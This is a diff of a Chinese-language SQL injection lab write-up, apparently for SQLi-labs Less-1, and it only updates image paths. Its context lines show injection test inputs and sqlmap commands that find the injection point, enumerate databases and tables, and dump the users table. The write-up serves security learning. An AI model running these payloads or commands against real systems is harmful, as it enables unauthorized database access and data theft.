@@ -19,7 +19,7 @@
 
 　　 **?id=1' 报错回显**
 
-![](assets/Less1/file-20260530160846174.png)
+![](assets/Less-1/file-20260530180128249.png)
 
 　　 **?id=1' and 1=1--+ 正常**
 
@@ -86,12 +86,12 @@
 **sqlmap**
 
 sqlmap -u "ip/Less-1/?id=1"  #检测注入点
-![[Pasted image 20260529161026.png]]
+![[assets/Pasted image 20260529161026.png]]
 
 sqlmap -u "ip/Less-1/?id=1" --dbs  #列出所有数据表
-![[Pasted image 20260529161331.png]]
+![[assets/Pasted image 20260529161331.png]]
 sqlmap -u "ip/Less-1/?id=1" -D security --tables  #列表
-![[Pasted image 20260529161542.png]]
+![[assets/Pasted image 20260529161542.png]]
 
 sqlmap -u "ip/Less-1/?id=1" -D security -T users --dump #托数据
-![[Pasted image 20260529161804.png]]
+![[assets/Pasted image 20260529161804.png]]
